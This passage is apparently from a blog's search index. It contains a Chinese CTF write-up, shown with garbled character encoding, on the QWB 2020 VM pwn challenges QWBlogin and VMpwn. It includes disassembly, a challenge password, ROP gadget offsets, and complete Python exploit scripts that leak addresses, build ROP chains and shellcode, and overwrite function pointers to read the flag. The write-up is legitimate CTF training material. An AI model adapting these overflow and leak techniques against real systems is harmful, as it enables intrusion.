class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r5</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x574f4e54494e5750</span><span class="hljs-keyword">push</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r5</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, r16<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0xf</span><span class="hljs-keyword">syscall</span> stack<span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x800</span><span class="hljs-keyword">syscall</span> stack| read(<span class="hljs-number">0</span>, stack[], <span class="hljs-number">0x800</span>)<span class="hljs-keyword">cmp</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0</span>         <span class="hljs-keyword">jnl</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">hlt</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r3</span>, <span class="hljs-built_in">r0</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>, <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">r2</span>, <span class="hljs-built_in">r4</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>, <span class="hljs-built_in">qword</span> <span class="hljs-number">0x2</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> r16, r17      <span class="hljs-keyword">pop</span> <span class="hljs-built_in">qword</span> r17<span class="hljs-keyword">ret</span></code></pre><p>äºæ˜¯ç¨‹åºå°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œå¦‚æœè¾“å…¥äº†<code>password</code>ä¸º<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>å°±èƒ½èµ°åˆ°æœ€åæº¢å‡ºçš„åœ°æ–¹</p><p>æœ€ååœ¨<code>read(0, stack, 0x800)</code>çš„åœ°æ–¹ä¼šå‡ºç°æº¢å‡ºï¼Œç„¶ååœ¨<code>ret</code>çš„æ—¶å€™æŠŠæ ˆä¸Šçš„å†…å®¹<code>pop</code>åˆ°<code>vm.pc</code>ï¼Œäºæ˜¯å°±éœ€è¦åœ¨<code>test.bin</code>é‡Œé¢æ‰¾åˆ°å¯ä»¥ç”¨<code>gadgets</code></p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h4><p>åœ¨ç¨‹åº<code>RET</code>ä¹‹åè¿˜æœ‰ä¸€å¤§æ®µæ— å…³çš„<code>opcode</code>ï¼Œåšåˆ°è¿™æ­¥çš„æ—¶å€™æ‰çŸ¥é“ï¼Œè¿™äº›å°±æ˜¯ä¸ºäº†å‡‘<code>gadgets</code>çš„</p><p>å…¶ä¸­æ ‡è®°ä¸º<code>R</code>çš„æ˜¯ä¸éœ€è¦é™åˆ¶çš„</p><pre><code class="hljs python"><span class="hljs-comment"># 0x0d 0xR6 0x00 0x11 0xRR</span>pop_r00_ret = <span class="hljs-number">0x2f5</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x01 0X11 0xRR</span>pop_r01_ret = <span class="hljs-number">0x377</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x02 0x11 0xRR</span>pop_r02_ret = <span class="hljs-number">0x45c</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x0d 0xR6 0x03 0x11 0xRR</span>pop_r03_ret = <span class="hljs-number">0x4e1</span>         <span class="hljs-comment"># 0x46</span><span class="hljs-comment"># 0x20 0x0a 0x11 0xRR</span>sys_open_ret = <span class="hljs-number">0x6ed</span><span class="hljs-comment"># 0x20 0xR8 0x11 0xRR</span>sys_data_ret = <span class="hljs-number">0x5b1</span><span class="hljs-comment"># 0x20 0xR9 0x11 0xRR</span>sys_stack_ret = <span class="hljs-number">0x617</span></code></pre><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>ç”±äº<code>syscall</code>ä¸­åªæœ‰<code>open | read | write | close</code>å¯ç”¨ï¼Œå¾ˆè‡ªç„¶æƒ³åˆ°<code>orw</code>ï¼Œç„¶åæ„é€ <code>rop</code>é“¾å°±è¡Œäº†ï¼Œå…¶ä¸­ç”±äºæœ€å¼€å§‹æ‰“å¼€äº†<code>test.bin</code>æ–‡ä»¶ï¼Œæ‰€ä»¥<code>fd=4</code>ï¼Œæœ€åˆå†™<code>exp</code>çš„æ—¶å€™è¢«å‘äº†ä¸€ä¸‹ï¼Œä»¥åŠè°ƒè¯•çš„æ—¶å€™å¸Œæœ›èƒ½æœ‰ç»“æ„ä½“çš„ç¬¦å·ï¼Œæˆ‘ç¼–è¯‘äº†<code>struct.c =&gt; struct.o</code>å†åœ¨è°ƒè¯•çš„æ—¶å€™<code>add-symbol-file struct.o 0</code>å³å¯</p><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x108</span><span class="hljs-comment"># read(0, data[0x100], 0x20)</span><span class="hljs-comment"># r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x20</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># open(data[0x100], 0)</span><span class="hljs-comment"># r00 = 0 r01 = 0x200 r02 = 0</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0</span>)payload += p64(sys_open_ret)<span class="hljs-comment"># read(4, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x4</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)<span class="hljs-comment"># write(1, data[0x100], 0x30)</span><span class="hljs-comment"># r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30</span>payload += p64(pop_r00_ret) + p64(<span class="hljs-number">2</span>) + p64(pop_r01_ret) + p64(<span class="hljs-number">0x1</span>) + p64(pop_r02_ret) + p64(<span class="hljs-number">0x100</span>) + p64(pop_r03_ret) + p64(<span class="hljs-number">0x30</span>)payload += p64(sys_data_ret)</code></pre><p>å¼ºçš„å¤§ä½¬ï¼Œä¸éœ€è¦<code>instruction.h</code>éƒ½èƒ½åœ¨5ä¸ªå°æ—¶å†…åšå‡ºæ¥ï¼Œè€Œæˆ‘å°±æ˜¯åªèœé¸¡</p><p><a href="https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin">QWBlogin é¢˜ç›®</a></p><h2 id="VMpwn"><a href="#VMpwn" class="headerlink" title="VMpwn"></a>VMpwn</h2><p>è¿™ä¸ªé¢˜ç›®è·Ÿä¸Šä¸€ä¸ªé¢˜ç›®ä¸€æ ·å…ˆé€†å‘ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®è·Ÿ<code>QWBlogin</code>ç›¸æ¯”å®ç°<code>vm</code>çš„æ—¶å€™ç®€å•ä¸€äº›</p><p>å…¶ä¸­æœ‰ä¸€ä¸ª <code>chunk 0x30</code>ç”¨æ¥è®°å½•å¯„å­˜å™¨çš„å€¼<code>vm[0] vm[1] vm[2]</code> ç±»ä¼¼<code>rdi, rsi, rdx</code>åœ¨<code>syscall</code>æ—¶ä¼šç”¨åˆ°ï¼Œ<code>vm[3]</code>ä¸º<code>sp</code>ï¼Œ<code>vm[5]</code>ä¸º <code>pc</code></p><p>åœ¨æœ€åçš„å…³é”®æ“ä½œä¸ºå¯¹äº<code>read(0, stack, 0x1000)</code>ï¼ˆæ ˆåªæœ‰<code>0x100</code>ä¸ªå­—èŠ‚ï¼‰</p><pre><code class="hljs assembly">pwndbg&gt; distance 0x555555759050 0x55555575ad680x555555759050-&gt;0x55555575ad68 is 0x1d18 bytes (0x3a3 words) RAX  0x7ffff7b156c0 (read) â—‚â€” cmp    dword ptr [rip + 0x2c3039], 0 â–º 0x5555555555db    call   rax &lt;0x7ffff7b156c0&gt;        fd: 0x0        buf: 0x55555575ad68 â—‚â€” 0x0        nbytes: 0x1000pwndbg&gt; telescope 0x55555575801000:0000â”‚   0x555555758010 â—‚â€” 0x001:0008â”‚   0x555555758018 â€”â–¸ 0x55555575ad68 â—‚â€” 0x002:0010â”‚   0x555555758020 â—‚â€” 0x100003:0018â”‚   0x555555758028 â€”â–¸ 0x55555575ad68 â—‚â€” 0x004:0020â”‚   0x555555758030 â—‚â€” 0x005:0028â”‚   0x555555758038 â€”â–¸ 0x5555557572d6 â—‚â€” 0x772c6b6f11028f10</code></pre><p>ç„¶å<code>puts(stack)</code>ï¼Œå¯ä»¥çœ‹åˆ°è¯¥è™šæ‹Ÿæ ˆä¸Šæœ‰<code>heap</code>åœ°å€å’Œ<code>elf</code>åœ°å€ï¼Œä½†æ˜¯åªèƒ½æ³„æ¼ä¸€ä¸ª</p><pre><code class="hljs assembly">pwndbg&gt; telescope 0x55555575ad68 0x3000:0000â”‚ rsi  0x55555575ad68 â—‚â€” &#39;1234454636\n&#39;01:0008â”‚      0x55555575ad70 â—‚â€” 0xa3633 &#x2F;* &#39;36\n&#39; *&#x2F;02:0010â”‚      0x55555575ad78 â—‚â€” 0x0... â†“1e:00f0â”‚      0x55555575ae58 â€”â–¸ 0x555555758050 â—‚â€” 0x20746168772c6b6f (&#39;ok,what &#39;)1f:00f8â”‚      0x55555575ae60 â—‚â€” 0x020:0100â”‚      0x55555575ae68 â€”â–¸ 0x555555757851 â—‚â€” 0xff</code></pre><p>æ¥ä¸‹æ¥åŒç¬¬ä¸€æ­¥çš„<code>read(0, stack, 0x1000)</code> <code>write(0, stack, 0x20)</code>ç„¶å<code>ret</code></p><p>è¿™ä¸ªç¨‹åºä¸­æœ‰ä¸€ä¸ªä¸¤ä¸ªæ¯”è¾ƒå¥‡æ€ªçš„åœ°æ–¹ï¼Œç”±äº<code>ret</code>çš„æ—¶å€™ç¨‹åºçš„å®ç°ï¼Œæ˜¯å°†<code>sp-=8</code>ï¼Œä½†æ˜¯<code>PUSH</code>ä¸º<code>sp-=8</code> <code>POP</code>ä¸º<code>sp+=8</code>ï¼Œå› æ­¤<code>ret</code>çš„æ—¶å€™æ¯”è¾ƒå¥‡æ€ªï¼Œå¦å¤–å°±æ˜¯ä¸<code>QWBlogin</code>ç›¸æ¯”æ²¡æœ‰ ä»€ä¹ˆèƒ½ç”¨çš„<code>gadget</code>ï¼Œå› æ­¤æƒ³æ³•åªèƒ½ä¸ºæŒ‰ç…§<code>vm</code>çš„è§„åˆ™ï¼Œå†™<code>shellocde</code>ï¼Œç„¶ååœ¨æœ€å<code>ret</code>çš„æ—¶å€™è·³è½¬è¿‡å»ï¼Œä½†æ˜¯è¯¥é¢˜ç”¨ <code>seccomp</code>é™åˆ¶äº†åªèƒ½ <code>orw</code>ï¼Œä¸”æ²¡æœ‰ç»™<code>open</code>çš„ <code>syscall</code>åªèƒ½æ³„æ¼</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>å› æ­¤æ€è·¯å°±æ˜¯ï¼Œå…ˆåˆ©ç”¨<code>puts</code>æ³„æ¼<code>elf</code>çš„åœ°å€ï¼Œç„¶åå†<code>ret</code>åˆ°æœ€åˆ<code>elf_code+0x3</code>ç„¶åå†æ³„æ¼<code>heap</code>ï¼Œ<code>ret</code>åˆ°å†™å…¥æ ˆä¸Šçš„<code>shellcode</code></p><p>åˆ©ç”¨<code>puts</code>æ³„æ¼<code>libc</code>ï¼Œç„¶åå†æ¬¡è¾“å…¥åˆ°æ ˆä¸Šï¼Œåˆ©ç”¨<code>\x6d: mov reg[0], 0</code>ä½œä¸º<code>nop</code>ï¼Œç¼–å†™<code>shellcode</code></p><p>ç„¶åå°†<code>open</code>å†™å…¥<code>free</code>çš„ä½ç½®ï¼Œå› æ­¤åœ¨è°ƒç”¨<code>syscall 03</code>æ—¶å°±æ˜¯è°ƒç”¨<code>open</code>ï¼Œæœ€ååˆ©ç”¨<code>orw</code>è¿›è¡Œè¯»å–<code>flag</code></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="hljs python"><span class="hljs-comment"># heap+0x2e68 =&gt; elf_bss</span>io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0xff</span>+<span class="hljs-string">&quot;#&quot;</span>)io.recvuntil(<span class="hljs-string">&quot;#&quot;</span>)elf.address = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x203851</span>success(<span class="hljs-string">&quot;elf&quot;</span>, elf.address)<span class="hljs-comment"># 0xf8 + ret </span>io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(elf.address + <span class="hljs-number">0x203023</span>))io.sendafter(<span class="hljs-string">&quot;name:&quot;</span>, <span class="hljs-string">&quot;\x50&quot;</span>)heap = u64(io.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">&quot;\x00\x00&quot;</span>) - <span class="hljs-number">0x50</span>success(<span class="hljs-string">&quot;heap&quot;</span>, heap)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">mov reg[0], read_got</span><span class="hljs-string">puts</span><span class="hljs-string">mov reg[0], 0</span><span class="hljs-string">mov reg[1], heap + addr</span><span class="hljs-string">mov reg[2], 0x1000</span><span class="hljs-string">read        </span><span class="hljs-string">//  use 0x6d: mov reg[0], 0 as nop</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;\x11&quot;</span> + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])payload += <span class="hljs-string">&quot;\x8f\x02&quot;</span>payload += <span class="hljs-string">&quot;\x6d&quot;</span>payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x1000</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>)payload += p64(heap+<span class="hljs-number">0x2d60</span>)io.sendafter(<span class="hljs-string">&quot;say:&quot;</span>, payload)io.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)libc.address = u64(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">flag</span><span class="hljs-string">0x6d * 0x50</span><span class="hljs-string">mov reg[1], elf.address+0x203900</span><span class="hljs-string">mov reg[2], 8</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], heap+0x2d60</span><span class="hljs-string">mov reg[1], 0</span><span class="hljs-string">open</span><span class="hljs-string">mov reg[0], 3</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">read</span><span class="hljs-string">mov reg[0], 1</span><span class="hljs-string">mov reg[1], bss</span><span class="hljs-string">mov reg[2], 0x30</span><span class="hljs-string">write</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>payload = <span class="hljs-string">&quot;flag\x00&quot;</span>payload = payload.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;\x6d&quot;</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.address+<span class="hljs-number">0x2038f8</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">8</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(heap+<span class="hljs-number">0x2d60</span>)payload += <span class="hljs-string">&quot;\x6e&quot;</span>payload += <span class="hljs-string">&quot;\x8f\x03&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">3</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x00&quot;</span>payload += <span class="hljs-string">&quot;\x11&quot;</span> + p64(<span class="hljs-number">1</span>)payload += <span class="hljs-string">&quot;\x12&quot;</span> + p64(elf.bss()+<span class="hljs-number">0x400</span>)payload += <span class="hljs-string">&quot;\x13&quot;</span> + p64(<span class="hljs-number">0x30</span>)payload += <span class="hljs-string">&quot;\x8f\x01&quot;</span>io.send(payload)sleep(<span class="hljs-number">0.03</span>)io.send(p64(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]))io.interactive()io.close()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>vm</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
